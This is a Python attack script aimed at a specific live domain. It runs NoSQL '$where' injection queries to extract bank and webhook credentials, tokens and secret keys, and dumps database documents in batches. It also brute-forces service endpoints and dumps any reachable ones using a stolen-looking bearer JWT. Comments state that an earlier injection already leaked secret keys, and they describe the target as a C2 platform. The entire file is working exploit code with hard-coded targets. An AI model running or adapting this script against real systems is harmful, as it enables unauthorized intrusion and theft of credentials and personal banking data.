#!/usr/bin/env python3
"""probe_sms_inject2.py — Sections 1 & 2 only: NoSQL cred extraction + pbapi endpoint scan.
   Find webhook device credentials (username/password) via MongoDB injection on pbapi.
"""
import json, pathlib, requests, time

TID    = "af6efb584a3d317b5a11ab6209b88e1b"
MGAPI  = f"https://{TID}mgapi.asdgapicenterssdo.com"
PBAPI  = f"https://{TID}pbapi.asdgapicenterssdo.com"
JWT    = pathlib.Path("/home/kzp/claude-red/.jwt.vak88z2").read_text().strip()
DOMAIN = "m.vak88z2.com"
TS     = int(time.time())

def phdrs():
    return {"Authorization": f"Bearer {JWT}", "Content-Type": "application/json",
            "template": "vn", "Origin": f"https://{DOMAIN}"}

# ── SECTION 1: NoSQL $where to find device/webhook credentials ────────────────
print("=== SECTION 1: NoSQL $where credential extraction ===")

# The APK gets webhook creds (username/password per bank) from C2's /service/deposit/get-endpoint-webhook
# These credentials are stored somewhere on the platform (pbapi MongoDB).
# The $where injection on /pb/latest-win already worked for secret_keys.
# Try to find any collection/document with webhook device credentials.

nosql_probes = [
    # Collections that might store device provisioning data
    ("latest-win", "$where=this.password && this.username", "doc has both password+username"),
    ("latest-win", "$where=typeof(this.password)=='string' && this.password.length>5",
     "password string length>5"),
    ("latest-win", "$where=this.kbank_password", "kbank_password field"),
    ("latest-win", "$where=this.scb_password", "scb_password field"),
    ("latest-win", "$where=this.webhook_username", "webhook_username field"),
    ("latest-win", "$where=this.bank_username", "bank_username field"),
    ("latest-win", "$where=this.device_id", "device_id field"),
    ("latest-win", "$where=JSON.stringify(this).includes('webhook')", "webhook in any field"),
    ("latest-win", "$where=JSON.stringify(this).includes('kbank') && this.password",
     "kbank+password"),
    # Also try on latest-withdraw collection
    ("latest-withdraw", "$where=this.password", "withdraw: has password"),
    ("latest-withdraw", "$where=this.device_id || this.device_token", "withdraw: device fields"),
    # Broader — any document with auth-looking fields
    ("latest-win", "$where=this.token && this.username", "token+username"),
    ("latest-win", "$where=this.api_key", "api_key field"),
    ("latest-win", "$where=this.secret", "secret field"),
    # Try to dump ALL latest-win docs (max $limit)
    ("latest-win", "$limit=50&$skip=0", "dump first 50 docs"),
    ("latest-win", "$limit=50&$skip=50", "dump docs 50-100"),
    ("latest-win", "$limit=50&$skip=100", "dump docs 100-150"),
]

found_credentials = []
for ep, qs, label in nosql_probes:
    url = f"{PBAPI}/pb/{ep}?domain={DOMAIN}&{qs}"
    try:
        r = requests.get(url, timeout=15)
        if r.status_code == 200:
            data = r.json()
            total = data.get("total", 0)
            items = data.get("data", [])
            if total and total > 0:
                # Print all fields in all items looking for credentials
                print(f"\n  [{label}] total={total}")
                for i, item in enumerate(items[:3]):
                    keys = list(item.keys())
                    interesting = [k for k in keys if any(x in k.lower() for x in
                                   ["pass", "user", "token", "key", "secret", "cred",
                                    "auth", "webhook", "bank", "device"])]
                    print(f"    doc[{i}] keys: {keys}")
                    for k in interesting:
                        val = str(item[k])[:60]
                        print(f"    >> {k}: {val}")
                        if any(x in k.lower() for x in ["pass", "password"]):
                            found_credentials.append((item.get("username", "?"), item[k]))
            # For dump probes, print all docs
            if "$skip" in qs and items:
                print(f"\n  [{label}] {len(items)} docs:")
                for item in items[:5]:
                    print(f"    {json.dumps(item, ensure_ascii=False)[:300]}")
        else:
            print(f"  [{label}]: HTTP {r.status_code}")
    except Exception as e:
        print(f"  [{label}]: {e}")

if found_credentials:
    print(f"\n  [!!!] FOUND CREDENTIALS: {found_credentials}")
else:
    print("\n  No credentials found via $where injection on standard endpoints.")

# ── SECTION 2: pbapi FeathersJS service endpoint discovery ────────────────────
print("\n=== SECTION 2: pbapi FeathersJS service endpoint scan ===")
# FeathersJS auto-creates CRUD routes for each service/model
# The C2 system stores device provisioning data somewhere accessible via pbapi

candidate_services = [
    # SMS/device provisioning services
    "device", "devices", "sms-device", "sms_device", "lux-device",
    "device-provision", "provision",
    # Webhook config services
    "webhook", "webhooks", "webhook-config", "webhook_config",
    "bank-webhook", "bank_webhook", "deposit-webhook",
    # Bank credential services
    "bank-credential", "bank_credential", "bank-config", "bank_config",
    "kbank-config", "scb-config",
    # SMS/notification services
    "sms", "sms-log", "sms_log", "sms-config",
    "notification", "bank-notification",
    # C2 / provisioning data
    "c2", "bot-config", "lux-config",
    "operator", "operators",
    # FeathersJS auth services
    "authentication", "users", "accounts",
    # More generic
    "config", "settings", "system-config",
    "credential", "credentials", "token", "tokens",
    # Platform-specific
    "auto-deposit", "auto_deposit",
    "deposit-config", "deposit_config",
]

reachable = []
for svc in candidate_services:
    url = f"{PBAPI}/pb/{svc}?domain={DOMAIN}&$limit=1"
    try:
        r = requests.get(url, timeout=6)
        status = r.status_code
        if status not in (404,):
            body = r.text[:300]
            marker = " [!!!]" if status == 200 else ""
            print(f"  /pb/{svc}: HTTP {status}{marker}: {body[:120]}")
            if status == 200:
                reachable.append(svc)
    except Exception as e:
        pass  # DNS/timeout = 404 equivalent

if reachable:
    print(f"\n  [!!!] REACHABLE services: {reachable}")
    for svc in reachable:
        # Dump with authentication
        url = f"{PBAPI}/pb/{svc}?domain={DOMAIN}&$limit=10"
        r = requests.get(url, headers=phdrs(), timeout=10)
        if r.ok:
            data = r.json()
            print(f"\n  [AUTH DUMP] /pb/{svc}: total={data.get('total','?')}")
            for item in data.get("data", [])[:3]:
                print(f"    {json.dumps(item, ensure_ascii=False)[:400]}")

# Also try mgapi for webhook-related endpoints
print("\n  === mgapi webhook/sms endpoints ===")
mgapi_svc = [
    "/mb/webhook-credential", "/mb/device-token",
    "/mb/bank-device", "/mb/sms-config",
    "/mb/deposit-auto", "/mb/kbank-credential",
]
for path in mgapi_svc:
    try:
        r = requests.get(f"{MGAPI}{path}?$limit=5", headers=phdrs(), timeout=6)
        if r.status_code not in (404, 405):
            print(f"  {path}: HTTP {r.status_code}: {r.text[:150]}")
    except:
        pass

print("\n=== DONE ===")
